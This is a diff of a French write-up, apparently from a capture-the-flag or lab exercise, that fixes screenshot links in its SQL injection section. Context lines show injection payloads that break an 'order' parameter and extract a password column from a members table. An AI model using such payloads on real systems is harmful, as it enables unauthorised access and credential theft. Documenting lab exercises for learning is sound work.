@@ -402,7 +402,7 @@ Ensuite on casse la requête pour récupérer les informations a l'aide des erre
 ```
 ?action=contents&order='
 ```
-[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/1.png)
+![Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/1.png)
 
 Après j'ai fais la requête pour trouver la table et les colonnes.
 
@@ -449,9 +449,9 @@ et le mot de passe:
 ?action=contents&order=1,(SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1)--
 ```
 
-[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/2.png)
+![Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/2.png)
 
-[Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/3.png)
+[!Screenshot](https://raw.githubusercontent.com/nassimlnd/ci-cd/refs/heads/main/screenshots/7_InjectionSQL/3.png)
 
 ### 8 | Injection de commande - Contournement de filtre
 
